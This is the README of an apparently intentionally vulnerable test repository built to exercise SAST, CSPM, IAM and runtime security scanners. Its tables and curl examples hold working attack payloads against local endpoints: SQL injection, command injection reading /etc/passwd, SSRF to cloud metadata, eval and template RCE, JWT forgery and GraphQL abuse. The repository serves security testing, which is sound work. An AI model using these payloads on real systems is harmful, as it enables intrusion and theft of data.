# 🛡️ TigerGate CNAPP Target Simulator

> **World-class, intentionally vulnerable monorepo for CNAPP security testing.**
> Covers SAST, DAST, CSPM, CIEM, CWPP, KSPM, DSPM, API Security, and Runtime eBPF detection.

---

## ⚠️ Educational Use Only

This repository is **intentionally insecure**. It is designed to:
- Trigger SonarQube SAST findings across 5 languages
- Trigger Tigergate CNAPP detections across 9 security pillars
- Demonstrate real attack patterns for security education

**NEVER deploy any file from this repository in a production environment.**

---

## 🗺️ Architecture Overview

```
tigergate-test/
│
├── 📦 APPLICATION LAYER (SAST + DAST)
│   ├── nodejs/server.js        ← Express API (14 vulnerable endpoints)
│   ├── python/app.py           ← Flask API (12 vulnerable endpoints)
│   ├── php/index.php           ← DVWA-style PHP app (11 vulnerability pages)
│   ├── ruby/app.rb             ← Sinatra API (10 vulnerable endpoints)
│   └── java/VulnerableApp.java ← Java demo (8 vulnerability demos)
│
├── 🌐 API SECURITY LAYER
│   ├── api/graphql_server.js   ← GraphQL (8 API security findings)
│   ├── api/swagger.yaml        ← OpenAPI spec (no-auth endpoints)
│   └── api/soap_wsdl.xml       ← SOAP API
│
├── ☁️ CLOUD SECURITY LAYER (CSPM)
│   ├── cspm/aws_insecure.tf    ← AWS: S3/EC2/RDS misconfigs (CIS violations)
│   ├── cspm/azure_insecure.tf  ← Azure: NSG/Storage/SQL misconfigs
│   ├── cspm/gcp_insecure.tf    ← GCP: Bucket/Firewall/SA misconfigs
│   ├── cspm/oracle_insecure.tf ← Oracle Cloud misconfigs
│   └── cspm/azure_rbac.tf      ← Azure RBAC over-permissions
│
├── 🔑 IDENTITY LAYER (CIEM)
│   ├── ciem/overly_permissive_iam.tf  ← AWS IAM: Action:* Resource:*
│   ├── ciem/cross_account.tf          ← Cross-account trust: Principal:*
│   └── ciem/gcp_ciem.tf               ← GCP: roles/owner + allUsers
│
├── 🐳 WORKLOAD LAYER (CWPP + KSPM)
│   ├── cwpp/Dockerfile         ← EOL Tomcat, root, hardcoded creds
│   ├── cwpp/host_setup.sh      ← SSH + auditd disable
│   ├── kspm/vulnerable_deployment.yaml ← K8s: privileged pods, RBAC, secrets
│   └── docker/Dockerfile       ← Additional container misconfigs
│
├── ⚡ RUNTIME LAYER
│   └── runtime/attack_simulator.sh  ← 10-technique eBPF detection test
│
├── 📊 ADVANCED SAST
│   ├── sast_advanced/ssti_jinja.py         ← SSTI via render_template_string
│   └── sast_advanced/deserialization_gadget.js  ← node-serialize RCE
│
├── 🔐 SECRETS DETECTION
│   ├── secrets/hardcoded_credentials.txt  ← Scanner-triggering credentials
│   ├── secrets/jwt_tokens.json            ← alg:none JWT tokens
│   └── secrets/keys.pem                   ← RSA private key
│
└── 🏗️ INFRASTRUCTURE AS CODE
    ├── iac/terraform/                      ← Generic IaC misconfigs
    └── serverless/                         ← Lambda + serverless.yml misconfigs
```

---

## 🚀 Quick Start

```bash
# 1. Clone and install dependencies
git clone <this-repo>
cd tigergate-test
make install

# 2. Validate all source files
make test

# 3. Start all services
make start

# 4. Run runtime attack simulation
make attack

# 5. Run all security scanners
make scan-all
```

---

## 📋 Vulnerability Index

### Application Layer (SAST/DAST)

| File | Vuln | CWE | Sonar Rule | Attack Example |
|------|------|-----|-----------|---------------|
| `nodejs/server.js` | SQL Injection (×5) | 89 | S3649 | `?search=' OR '1'='1` |
| `nodejs/server.js` | OS Command Injection | 78 | S4721 | `?cmd=id;cat /etc/passwd` |
| `nodejs/server.js` | Path Traversal | 22 | S2083 | `?name=../../etc/passwd` |
| `nodejs/server.js` | SSRF | 918 | S5144 | `?url=http://169.254.169.254/` |
| `nodejs/server.js` | eval() RCE | 94 | S1523 | `?code=require('child_process')...` |
| `nodejs/server.js` | JWT alg:none bypass | 347 | – | Token with `"alg":"none"` |
| `nodejs/server.js` | Hardcoded AWS Keys | 798 | S6418 | `AKIAIOSFODNN7EXAMPLE` in code |
| `python/app.py` | SQL Injection (×4) | 89 | S3649 | `?id=1 OR 1=1` |
| `python/app.py` | eval() / SSTI | 94 | S1523 | `?expr=__import__('os').system('id')` |
| `python/app.py` | Pickle RCE | 502 | – | Malicious base64 pickle payload |
| `python/app.py` | YAML RCE | 502 | – | `!!python/object/apply:os.system` |
| `python/app.py` | SSRF | 918 | S5144 | `?url=file:///etc/passwd` |
| `php/index.php` | SQL Injection (×4) | 89 | S3649 | `?id=1 UNION SELECT user(),...` |
| `php/index.php` | Reflected + Stored XSS | 79 | S2588 | `?name=<script>alert(1)</script>` |
| `php/index.php` | OS Command Injection | 78 | S4721 | `?cmd=cat+/etc/passwd` |
| `php/index.php` | LFI / Path Traversal | 22 | S2083 | `?filename=/etc/passwd` |
| `php/index.php` | Unrestricted Upload | 434 | – | Upload `shell.php` webshell |
| `php/index.php` | XXE | 611 | S2755 | XML with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| `ruby/app.rb` | OS Command (backtick) | 78 | – | `?cmd=id` |
| `ruby/app.rb` | Marshal.load RCE | 502 | – | Malicious base64 Marshal payload |
| `ruby/app.rb` | SSRF | 918 | – | `?url=http://169.254.169.254/` |
| `java/VulnerableApp.java` | Runtime.exec() injection | 78 | S4721 | `java VulnerableApp exec "id"` |
| `java/VulnerableApp.java` | XXE via DocumentBuilder | 611 | S2755 | XML with DOCTYPE + ENTITY |
| `java/VulnerableApp.java` | ObjectInputStream RCE | 502 | S4508 | Commons-collections gadget chain |
| `java/VulnerableApp.java` | Math.random() weak PRNG | 338 | S2245 | Token prediction |

### Cloud Security (CSPM)

| File | Issue | CIS Benchmark | Severity |
|------|-------|--------------|---------|
| `cspm/aws_insecure.tf` | S3 public + wildcard PutObject | CIS 2.1.1 | Critical |
| `cspm/aws_insecure.tf` | EC2 SG 0.0.0.0/0 all-ports | CIS 4.1 | Critical |
| `cspm/aws_insecure.tf` | EC2 IMDSv1 (SSRF → IAM creds) | CIS 5.6 | High |
| `cspm/aws_insecure.tf` | RDS publicly_accessible + no SSL | CIS 6.6/6.7 | Critical |
| `cspm/aws_insecure.tf` | CloudTrail MISSING | CIS 3.1 | Critical |
| `cspm/aws_insecure.tf` | GuardDuty MISSING | CIS 5.2 | High |
| `cspm/azure_insecure.tf` | NSG allows all inbound (SSH+RDP) | CIS 6.1/6.2 | Critical |
| `cspm/azure_insecure.tf` | Storage: HTTP allowed + public blobs | CIS 3.1/3.7 | High |
| `cspm/azure_insecure.tf` | Azure SQL no encryption | CIS 4.5 | High |
| `cspm/gcp_insecure.tf` | GCS bucket allUsers objectAdmin | CIS 5.1 | Critical |
| `cspm/gcp_insecure.tf` | SA private key in non-sensitive output | CIS 1.6 | Critical |

### Identity (CIEM)

| File | Issue | Severity |
|------|-------|---------|
| `ciem/overly_permissive_iam.tf` | `Action:*` + `Resource:*` | Critical |
| `ciem/overly_permissive_iam.tf` | Cross-account trust `Principal:*` | Critical |
| `ciem/overly_permissive_iam.tf` | Lambda with AdministratorAccess | High |
| `ciem/overly_permissive_iam.tf` | EC2 role with `iam:PassRole` (escalation) | High |
| `kspm/vulnerable_deployment.yaml` | `system:anonymous → cluster-admin` | Critical |

### Runtime (CWPP)

| Technique | Tigergate Detection | File |
|-----------|-------------------|------|
| Fileless /dev/shm execution | RT-001 | `runtime/attack_simulator.sh` |
| Base64 obfuscated payload | RT-002 | `runtime/attack_simulator.sh` |
| K8s SA token theft | RT-006 | `runtime/attack_simulator.sh` |
| Reverse shell attempt | RT-009 | `runtime/attack_simulator.sh` |
| Log tampering | RT-010 | `runtime/attack_simulator.sh` |

---

## 🧪 Testing Each Vulnerability

### Node.js Endpoints

```bash
# SQL Injection – returns all users
curl "http://localhost:3000/api/users?search=' OR '1'='1"

# OS Command Injection – executes id command
curl "http://localhost:3000/api/exec?cmd=id"

# eval() RCE – executes Node.js
curl "http://localhost:3000/api/evaluate?code=process.env.DB_PASSWORD"

# SSRF – hits cloud metadata
curl "http://localhost:3000/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# Path Traversal
curl "http://localhost:3000/api/file?name=../../etc/passwd"

# JWT alg:none bypass (manually craft token with alg:none)
TOKEN=$(echo '{"alg":"none","typ":"JWT"}' | base64).$(echo '{"user":"admin"}' | base64).
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/jwt-verify
```

### Python Endpoints

```bash
# SQLi
curl "http://localhost:5000/api/user?id=1 UNION SELECT username,password,3,4 FROM users--"

# SSTI → RCE
curl "http://localhost:5000/api/greet?name={{7*7}}"
curl "http://localhost:5000/api/greet?name={{config.items()}}"

# eval() RCE
curl "http://localhost:5000/api/calc?expr=__import__('os').popen('id').read()"

# SSRF → read local file (urllib supports file://)
curl "http://localhost:5000/api/fetch?url=file:///etc/passwd"

# Environment variables exposure
curl "http://localhost:5000/api/platform-info"
```

### GraphQL Attacks

```bash
# Introspection – schema dump
curl -X POST http://localhost:4000/ \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}'

# IDOR – get any user without auth
curl -X POST http://localhost:4000/ \
  -H 'Content-Type: application/json' \
  -d '{"query":"{user(id:1){username,password,ssn,creditCardNumber,cvv}}"}'

# DoS – deeply nested query
curl -X POST http://localhost:4000/ \
  -H 'Content-Type: application/json' \
  -d '{"query":"{users{friends{friends{friends{friends{friends{username}}}}}}}"}'

# Mass assignment – elevate self to admin
curl -X POST http://localhost:4000/ \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation{updateUser(id:2,role:\"admin\"){username,role}}"}'
```

---

## 🔧 Scanner Setup

### SonarQube (no local install)
```bash
# Start SonarQube
docker run -d --name sonarqube -p 9000:9000 sonarqube:lts-community

# Analyze (after getting token from http://localhost:9000)
export SONAR_TOKEN=your_token_here
make scan-sonar
```

### Checkov (IaC scan)
```bash
make scan-checkov
# Or directly:
docker run --rm -v $(pwd):/src bridgecrew/checkov -d /src/cspm
```

### Trivy (container scan)
```bash
make scan-trivy
```

---

## 🌿 Branch Structure

For CNAPP-focused domain testing, checkout the feature branches:

| Branch | Focus | Files |
|--------|-------|-------|
| `feature/cspm` | IaC misconfigs only | AWS/Azure/GCP Terraform |
| `feature/cwpp` | Container/workload security | Dockerfiles, K8s pods, runtime scripts |
| `feature/ciem` | IAM over-permissions | AWS/GCP/Azure/K8s RBAC |
| `feature/cnapp` | All pillars + attack path + DSPM + AI-SPM | Lateral movement Terraform, PII SQL, LLM config |

```bash
git checkout feature/cspm   # CSPM branch
git checkout feature/cwpp   # CWPP branch
git checkout feature/ciem   # CIEM branch
git checkout feature/cnapp  # CNAPP branch
```

---

## 📖 Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CIS AWS Benchmark](https://www.cisecurity.org/benchmark/amazon_web_services)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [SonarQube Rules Explorer](https://rules.sonarsource.com/)
